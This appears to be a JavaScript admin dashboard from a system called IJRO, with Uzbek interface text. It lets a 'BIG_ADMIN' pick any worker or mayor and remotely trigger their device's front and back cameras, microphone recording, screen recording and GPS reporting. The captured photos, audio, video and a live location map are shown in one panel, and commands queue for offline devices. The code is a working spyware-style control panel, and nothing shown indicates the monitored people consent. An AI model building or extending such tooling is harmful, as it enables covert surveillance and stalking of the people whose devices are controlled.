// IJRO Big Admin Module (Full Surveillance, Device Control, Photo/Audio/Screen/GPS)

let adminSelectedUsername = null;
let adminDeviceListeners = {};
let adminDeviceData = {
  heartbeat: 0,
  battery: null,
  isGps: true,
  lat: null,
  lon: null,
  photos: [],
  currentPhotoIdx: 0,
  audios: [],
  currentAudioIdx: 0,
  screens: [],
  currentScreenIdx: 0,
  statusMsg: '',
  isAudioRecordingActive: false
};

function initAdminView() {
  const trackable = (window.store.users || []).filter(u => u.role === 'WORKER' || u.role === 'MAYOR');
  if (!adminSelectedUsername && trackable.length > 0) {
    adminSelectedUsername = trackable[0].username;
  }
  attachAdminDeviceListeners(adminSelectedUsername);
  renderAdminView();
}

function attachAdminDeviceListeners(devId) {
  if (!devId || !window.firebaseRtdb) return;

  // Detach previous
  Object.keys(adminDeviceListeners).forEach(k => {
    try {
      if (adminDeviceListeners[k]) {
        adminDeviceListeners[k].ref.off('value', adminDeviceListeners[k].cb);
      }
    } catch (_) {}
  });
  adminDeviceListeners = {};

  const db = window.firebaseRtdb;
  const devRef = db.ref(`tracking/devices/${devId}`);

  // Heartbeat
  const hbCb = snap => {
    adminDeviceData.heartbeat = snap.val() || 0;
    updateAdminStatusHeader();
  };
  devRef.child('heartbeat').on('value', hbCb);
  adminDeviceListeners['heartbeat'] = { ref: devRef.child('heartbeat'), cb: hbCb };

  // Info (Battery)
  const infoCb = snap => {
    const val = snap.val() || {};
    adminDeviceData.battery = val.battery !== undefined ? val.battery : null;
    updateAdminStatusHeader();
  };
  devRef.child('info').on('value', infoCb);
  adminDeviceListeners['info'] = { ref: devRef.child('info'), cb: infoCb };

  // Location
  const locCb = snap => {
    const loc = snap.val() || {};
    if (loc.lat && loc.lon) {
      adminDeviceData.lat = loc.lat;
      adminDeviceData.lon = loc.lon;
      updateAdminMapLocation(loc.lat, loc.lon);
    }
  };
  devRef.child('location').on('value', locCb);
  adminDeviceListeners['location'] = { ref: devRef.child('location'), cb: locCb };

  // Archive Photos
  const photosCb = snap => {
    const list = [];
    snap.forEach(child => {
      const v = child.val();
      if (v && (v.back_base64 || v.front_base64)) {
        list.push(v);
      }
    });
    adminDeviceData.photos = list;
    if (list.length > 0) adminDeviceData.currentPhotoIdx = list.length - 1;
    renderAdminPhotos();
  };
  devRef.child('media/archive_photos').limitToLast(20).on('value', photosCb);
  adminDeviceListeners['photos'] = { ref: devRef.child('media/archive_photos'), cb: photosCb };

  // Archive Audio
  const audioCb = snap => {
    const list = [];
    snap.forEach(child => {
      const v = child.val();
      if (v && v.audio_base64) {
        list.push(v);
      }
    });
    adminDeviceData.audios = list;
    if (list.length > 0) adminDeviceData.currentAudioIdx = list.length - 1;
    renderAdminAudio();
  };
  devRef.child('media/archive_audio').limitToLast(20).on('value', audioCb);
  adminDeviceListeners['audio'] = { ref: devRef.child('media/archive_audio'), cb: audioCb };

  // Archive Screen
  const screenCb = snap => {
    const list = [];
    snap.forEach(child => {
      const v = child.val();
      if (v && (v.screen_base64 || v.video_base64)) {
        list.push(v);
      }
    });
    adminDeviceData.screens = list;
    if (list.length > 0) adminDeviceData.currentScreenIdx = list.length - 1;
    renderAdminScreenCapture();
  };
  devRef.child('media/archive_screen').limitToLast(20).on('value', screenCb);
  adminDeviceListeners['screen'] = { ref: devRef.child('media/archive_screen'), cb: screenCb };

  // Status message toast
  const statusCb = snap => {
    const msg = snap.val();
    if (msg) {
      showToast(msg);
    }
  };
  devRef.child('media/status').on('value', statusCb);
  adminDeviceListeners['status'] = { ref: devRef.child('media/status'), cb: statusCb };
}

function selectAdminDevice(username) {
  adminSelectedUsername = username;
  adminDeviceData.photos = [];
  adminDeviceData.audios = [];
  adminDeviceData.screens = [];
  attachAdminDeviceListeners(username);
  renderAdminView();
}

function renderAdminView() {
  resetAdminMap();
  const container = document.getElementById('admin-content');
  if (!container) return;

  const trackableUsers = (window.store.users || []).filter(u => u.role === 'WORKER' || u.role === 'MAYOR');

  container.innerHTML = `
    <!-- 1. Device Selector -->
    <div class="task-card" style="padding: 14px;">
      <div style="font-size: 12px; font-weight: 600; color: var(--text-secondary); margin-bottom: 6px;">
        Nazorat qilinayotgan xodim / qurilma:
      </div>
      <select id="admin-device-select" class="form-control" style="width: 100%; font-weight: bold; padding: 8px; border-radius: 8px; border: 1px solid #CBD5E1;" onchange="selectAdminDevice(this.value)">
        ${trackableUsers.map(u => `
          <option value="${u.username}" ${u.username === adminSelectedUsername ? 'selected' : ''}>
            ${escapeHtml(u.fullName || (u.firstName + ' ' + u.lastName))} (${u.position || u.role}) - @${u.username}
          </option>
        `).join('')}
      </select>

      <div id="admin-device-status-badge" style="display: flex; align-items: center; justify-content: space-between; margin-top: 10px; font-size: 12px;">
        <!-- Filled by updateAdminStatusHeader() -->
      </div>
    </div>

    <!-- 2. Remote Command Buttons -->
    <div class="task-card" style="padding: 14px;">
      <div style="font-size: 13px; font-weight: bold; color: var(--navy-dark); margin-bottom: 10px;">
        ⚡ Masofaviy Boshqaruv Buyruqlari
      </div>
      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
        <button class="btn btn-primary" onclick="adminSendTakePhoto()" style="display: flex; align-items: center; justify-content: center; gap: 6px;">
          📷 Rasm Olish
        </button>
        <button id="admin-voice-btn" class="btn ${adminDeviceData.isAudioRecordingActive ? 'btn-red' : 'btn-yellow'}" onclick="adminToggleRecordAudio()" style="display: flex; align-items: center; justify-content: center; gap: 6px;">
          ${adminDeviceData.isAudioRecordingActive ? "⏹ To'xtatish" : "🎙️ Ovoz Yozish"}
        </button>
        <button class="btn" onclick="adminSendRecordScreen()" style="background: #7C3AED; color: white; display: flex; align-items: center; justify-content: center; gap: 6px;">
          📹 Ekran Zapis
        </button>
        <button class="btn btn-outline" onclick="adminSendRequestGps()" style="display: flex; align-items: center; justify-content: center; gap: 6px;">
          🛰️ GPS Yangilash
        </button>
      </div>
    </div>

    <!-- 3. Live Map -->
    <div class="task-card" style="padding: 14px;">
      <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
        <div style="font-weight: bold; font-size: 13px; color: var(--navy-dark); display: flex; align-items: center; gap: 6px;">
          📍 Jonli Joylashuv (Xarita)
        </div>
        <div id="admin-coords-text" style="font-size: 11px; color: var(--text-secondary);">
          ${adminDeviceData.lat ? `${adminDeviceData.lat.substring(0, 8)}, ${adminDeviceData.lon.substring(0, 8)}` : 'Aniqlanmoqda...'}
        </div>
      </div>
      <div id="admin-map-container" style="width: 100%; height: 240px; border-radius: 8px; border: 1px solid #E2E8F0; z-index: 1; background: #0F172A;"></div>
    </div>

    <!-- 4. Photos (Back & Front) -->
    <div class="task-card" style="padding: 14px;">
      <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
        <div style="font-weight: bold; font-size: 13px; color: var(--navy-dark);">
          📷 Masofaviy Kameralar
        </div>
        <div id="admin-photo-counter" style="font-size: 11px; font-weight: bold; color: var(--primary-blue);"></div>
      </div>
      <div id="admin-photos-container">
        <!-- Rendered by renderAdminPhotos() -->
      </div>
    </div>

    <!-- 5. Dictaphone Audio Archive -->
    <div class="task-card" style="padding: 14px;">
      <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
        <div style="font-weight: bold; font-size: 13px; color: var(--navy-dark);">
          🎙️ Yozib Olingan Ovozlar
        </div>
        <div id="admin-audio-counter" style="font-size: 11px; font-weight: bold; color: var(--primary-blue);"></div>
      </div>
      <div id="admin-audio-container">
        <!-- Rendered by renderAdminAudio() -->
      </div>
    </div>

    <!-- 6. Screen Recordings / Screenshots -->
    <div class="task-card" style="padding: 14px;">
      <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
        <div style="font-weight: bold; font-size: 13px; color: var(--navy-dark);">
          📹 Ekran Tasvirlari
        </div>
        <div id="admin-screen-counter" style="font-size: 11px; font-weight: bold; color: var(--primary-blue);"></div>
      </div>
      <div id="admin-screen-container">
        <!-- Rendered by renderAdminScreenCapture() -->
      </div>
    </div>
  `;

  updateAdminStatusHeader();
  renderAdminPhotos();
  renderAdminAudio();
  renderAdminScreenCapture();
  if (adminDeviceData.lat && adminDeviceData.lon) {
    updateAdminMapLocation(adminDeviceData.lat, adminDeviceData.lon);
  }
}

function updateAdminStatusHeader() {
  const badgeEl = document.getElementById('admin-device-status-badge');
  if (!badgeEl) return;

  const now = Date.now();
  const isOnline = (now - adminDeviceData.heartbeat) < 65000;
  const batteryStr = adminDeviceData.battery !== null ? `🔋 ${adminDeviceData.battery}%` : '🔋 --';

  badgeEl.innerHTML = `
    <div style="display: flex; align-items: center; gap: 6px;">
      <span style="display: inline-block; width: 10px; height: 10px; border-radius: 50%; background: ${isOnline ? '#16A34A' : '#F59E0B'};"></span>
      <span style="font-weight: bold; color: ${isOnline ? '#16A34A' : '#D97706'};">${isOnline ? 'Online (Faol)' : 'Offline (Kutish rejimida)'}</span>
      ${!isOnline ? '<span style="font-size: 10px; color: var(--text-secondary); margin-left: 4px;">(Buyruqlar navbatga yoziladi)</span>' : ''}
    </div>
    <div style="color: var(--text-secondary); font-weight: 600;">
      ${batteryStr}
    </div>
  `;
}

let adminLeafletMap = null;
let adminLeafletMarker = null;

function resetAdminMap() {
  if (adminLeafletMap) {
    try {
      adminLeafletMap.remove();
    } catch (_) {}
    adminLeafletMap = null;
    adminLeafletMarker = null;
  }
}

function updateAdminMapLocation(lat, lon) {
  const coordsEl = document.getElementById('admin-coords-text');
  if (coordsEl) coordsEl.innerText = `${lat.toString().substring(0, 8)}, ${lon.toString().substring(0, 8)}`;

  const latNum = parseFloat(lat);
  const lonNum = parseFloat(lon);
  if (isNaN(latNum) || isNaN(lonNum)) return;

  const mapContainer = document.getElementById('admin-map-container');
  if (!mapContainer) return;

  // Leaflet kutubxonasi yuklanganligini tekshirish
  if (typeof L === 'undefined') {
    mapContainer.innerHTML = `<div style="padding: 20px; text-align: center; color: #94A3B8; font-size: 12px;">Xarita yuklanmoqda (${latNum}, ${lonNum})...</div>`;
    return;
  }

  if (!adminLeafletMap) {
    try {
      adminLeafletMap = L.map('admin-map-container', {
        zoomControl: true,
        attributionControl: false
      }).setView([latNum, lonNum], 16);

      // Mutlaqo tekin va ishonchli OpenStreetMap tile serveri
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '© OpenStreetMap'
      }).addTo(adminLeafletMap);

      adminLeafletMarker = L.marker([latNum, lonNum]).addTo(adminLeafletMap);
      adminLeafletMarker.bindPopup("<b>📍 Xodim jonli joylashuvi</b>").openPopup();
    } catch (e) {
      console.warn("Leaflet init error:", e);
    }
  } else {
    try {
      adminLeafletMap.setView([latNum, lonNum], 16);
      if (adminLeafletMarker) {
        adminLeafletMarker.setLatLng([latNum, lonNum]);
      } else {
        adminLeafletMarker = L.marker([latNum, lonNum]).addTo(adminLeafletMap);
        adminLeafletMarker.bindPopup("<b>📍 Xodim jonli joylashuvi</b>").openPopup();
      }
    } catch (e) {
      console.warn("Leaflet update error:", e);
    }
  }

  setTimeout(() => {
    if (adminLeafletMap) {
      adminLeafletMap.invalidateSize();
    }
  }, 250);
}

// Commands
function adminSendTakePhoto() {
  if (!adminSelectedUsername || !window.firebaseRtdb) return;
  const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/take_photo`).set(Date.now());
  showToast(isOnline ? "📷 Rasm olish buyrug'i yuborildi!" : "📷 Rasm olish buyrug'i navbatga qo'yildi (qurilma ulanganda olinadi)");
}

function adminToggleRecordAudio() {
  if (!adminSelectedUsername || !window.firebaseRtdb) return;
  const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
  const nextState = !adminDeviceData.isAudioRecordingActive;
  adminDeviceData.isAudioRecordingActive = nextState;
  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/record_audio`).set(nextState);

  const btn = document.getElementById('admin-voice-btn');
  if (btn) {
    btn.innerText = nextState ? "⏹ To'xtatish" : "🎙️ Ovoz Yozish";
    btn.className = nextState ? "btn btn-red" : "btn btn-yellow";
  }
  showToast(nextState ? (isOnline ? "🎙️ Masofaviy ovoz yozish boshlandi" : "🎙️ Ovoz yozish navbatga qo'yildi") : "🎙️ Ovoz yozish to'xtatildi, saqlanmoqda...");
}

function adminSendRecordScreen() {
  if (!adminSelectedUsername || !window.firebaseRtdb) return;
  const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/record_screen`).set(Date.now());
  showToast(isOnline ? "📹 Ekran zapis buyrug'i yuborildi!" : "📹 Ekran zapis navbatga qo'yildi");
}

function adminSendRequestGps() {
  if (!adminSelectedUsername || !window.firebaseRtdb) return;
  const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/request_gps`).set(Date.now());
  showToast(isOnline ? "🛰️ GPS yangilash so'rovi yuborildi!" : "🛰️ GPS so'rovi navbatga qo'yildi");
}

// Photos Viewer
function renderAdminPhotos() {
  const container = document.getElementById('admin-photos-container');
  const counter = document.getElementById('admin-photo-counter');
  if (!container) return;

  const photos = adminDeviceData.photos;
  if (!photos || photos.length === 0) {
    if (counter) counter.innerText = '';
    container.innerHTML = `
      <div style="background: #F8FAFC; border-radius: 8px; padding: 24px; text-align: center; color: var(--text-secondary); font-size: 12px;">
        Hozircha suratlar mavjud emas. "Rasm Olish" tugmasini bosing.
      </div>
    `;
    return;
  }

  const idx = Math.max(0, Math.min(adminDeviceData.currentPhotoIdx, photos.length - 1));
  adminDeviceData.currentPhotoIdx = idx;
  const cur = photos[idx];
  if (counter) counter.innerText = `${idx + 1} / ${photos.length}`;

  const timeStr = cur.timestamp ? new Date(cur.timestamp).toLocaleString() : '';

  container.innerHTML = `
    <div style="font-size: 11px; color: var(--text-secondary); margin-bottom: 6px;">Vaqt: ${timeStr}</div>
    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
      <div>
        <div style="font-size: 11px; font-weight: bold; text-align: center; color: var(--text-secondary); margin-bottom: 4px;">Orqa Kamera</div>
        <div style="background: #000; border-radius: 8px; height: 160px; display: flex; align-items: center; justify-content: center; overflow: hidden;">
          ${cur.back_base64 ? `<img src="data:image/jpeg;base64,${cur.back_base64}" style="width: 100%; height: 100%; object-fit: cover;">` : `<span style="color: #64748B; font-size: 11px;">Mavjud emas</span>`}
        </div>
      </div>
      <div>
        <div style="font-size: 11px; font-weight: bold; text-align: center; color: var(--text-secondary); margin-bottom: 4px;">Oldi Kamera</div>
        <div style="background: #000; border-radius: 8px; height: 160px; display: flex; align-items: center; justify-content: center; overflow: hidden;">
          ${cur.front_base64 ? `<img src="data:image/jpeg;base64,${cur.front_base64}" style="width: 100%; height: 100%; object-fit: cover;">` : `<span style="color: #64748B; font-size: 11px;">Mavjud emas</span>`}
        </div>
      </div>
    </div>
    <div style="display: flex; justify-content: space-between; margin-top: 10px;">
      <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminPrevPhoto()" ${idx === 0 ? 'disabled' : ''}>◀ Oldingi</button>
      <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminNextPhoto()" ${idx === photos.length - 1 ? 'disabled' : ''}>Keyingi ▶</button>
    </div>
  `;
}

function adminPrevPhoto() {
  if (adminDeviceData.currentPhotoIdx > 0) {
    adminDeviceData.currentPhotoIdx--;
    renderAdminPhotos();
  }
}

function adminNextPhoto() {
  if (adminDeviceData.currentPhotoIdx < adminDeviceData.photos.length - 1) {
    adminDeviceData.currentPhotoIdx++;
    renderAdminPhotos();
  }
}

// Audio Viewer
function renderAdminAudio() {
  const container = document.getElementById('admin-audio-container');
  const counter = document.getElementById('admin-audio-counter');
  if (!container) return;

  const audios = adminDeviceData.audios;
  if (!audios || audios.length === 0) {
    if (counter) counter.innerText = '';
    container.innerHTML = `
      <div style="background: #F8FAFC; border-radius: 8px; padding: 20px; text-align: center; color: var(--text-secondary); font-size: 12px;">
        Ovoz yozuvlari mavjud emas. "Ovoz Yozish" buyrug'ini bering.
      </div>
    `;
    return;
  }

  const idx = Math.max(0, Math.min(adminDeviceData.currentAudioIdx, audios.length - 1));
  adminDeviceData.currentAudioIdx = idx;
  const cur = audios[idx];
  if (counter) counter.innerText = `${idx + 1} / ${audios.length}`;

  const timeStr = cur.timestamp ? new Date(cur.timestamp).toLocaleString() : '';

  container.innerHTML = `
    <div style="font-size: 11px; color: var(--text-secondary); margin-bottom: 6px;">Vaqt: ${timeStr}</div>
    <audio controls src="data:audio/3gpp;base64,${cur.audio_base64}" style="width: 100%; height: 38px; margin-bottom: 8px;"></audio>
    <div style="display: flex; justify-content: space-between;">
      <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminPrevAudio()" ${idx === 0 ? 'disabled' : ''}>◀ Oldingi</button>
      <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminNextAudio()" ${idx === audios.length - 1 ? 'disabled' : ''}>Keyingi ▶</button>
    </div>
  `;
}

function adminPrevAudio() {
  if (adminDeviceData.currentAudioIdx > 0) {
    adminDeviceData.currentAudioIdx--;
    renderAdminAudio();
  }
}

function adminNextAudio() {
  if (adminDeviceData.currentAudioIdx < adminDeviceData.audios.length - 1) {
    adminDeviceData.currentAudioIdx++;
    renderAdminAudio();
  }
}

// Screen Viewer
function renderAdminScreenCapture() {
  const container = document.getElementById('admin-screen-container');
  const counter = document.getElementById('admin-screen-counter');
  if (!container) return;

  const screens = adminDeviceData.screens;
  if (!screens || screens.length === 0) {
    if (counter) counter.innerText = '';
    container.innerHTML = `
      <div style="background: #F8FAFC; border-radius: 8px; padding: 20px; text-align: center; color: var(--text-secondary); font-size: 12px;">
        Ekran tasvirlari mavjud emas. "Ekran Zapis" tugmasini bosing.
      </div>
    `;
    return;
  }

  const idx = Math.max(0, Math.min(adminDeviceData.currentScreenIdx, screens.length - 1));
  adminDeviceData.currentScreenIdx = idx;
  const cur = screens[idx];
  if (counter) counter.innerText = `${idx + 1} / ${screens.length}`;

  const timeStr = cur.timestamp ? new Date(cur.timestamp).toLocaleString() : '';

  container.innerHTML = `
    <div style="font-size: 11px; color: var(--text-secondary); margin-bottom: 6px;">Vaqt: ${timeStr}</div>
    <div style="background: #000; border-radius: 8px; max-height: 240px; display: flex; align-items: center; justify-content: center; overflow: hidden; margin-bottom: 8px;">
      ${cur.video_base64 ? `
        <video controls src="data:video/mp4;base64,${cur.video_base64}" style="max-height: 240px; width: 100%;"></video>
      ` : (cur.screen_base64 ? `
        <img src="data:image/jpeg;base64,${cur.screen_base64}" style="max-height: 240px; width: 100%; object-fit: contain;">
      ` : `<span style="color: #64748B; font-size: 11px;">Tasvir yo'q</span>`)}
    </div>
    <div style="display: flex; justify-content: space-between;">
      <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminPrevScreen()" ${idx === 0 ? 'disabled' : ''}>◀ Oldingi</button>
      <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminNextScreen()" ${idx === screens.length - 1 ? 'disabled' : ''}>Keyingi ▶</button>
    </div>
  `;
}

function adminPrevScreen() {
  if (adminDeviceData.currentScreenIdx > 0) {
    adminDeviceData.currentScreenIdx--;
    renderAdminScreenCapture();
  }
}

function adminNextScreen() {
  if (adminDeviceData.currentScreenIdx < adminDeviceData.screens.length - 1) {
    adminDeviceData.currentScreenIdx++;
    renderAdminScreenCapture();
  }
}

// React to global store user changes
window.onStoreChange('users', () => {
  if (window.store.currentUser && window.store.currentUser.role === 'BIG_ADMIN') {
    const trackable = (window.store.users || []).filter(u => u.role === 'WORKER' || u.role === 'MAYOR');
    if (!adminSelectedUsername && trackable.length > 0) {
      adminSelectedUsername = trackable[0].username;
      attachAdminDeviceListeners(adminSelectedUsername);
    }
    renderAdminView();
  }
});
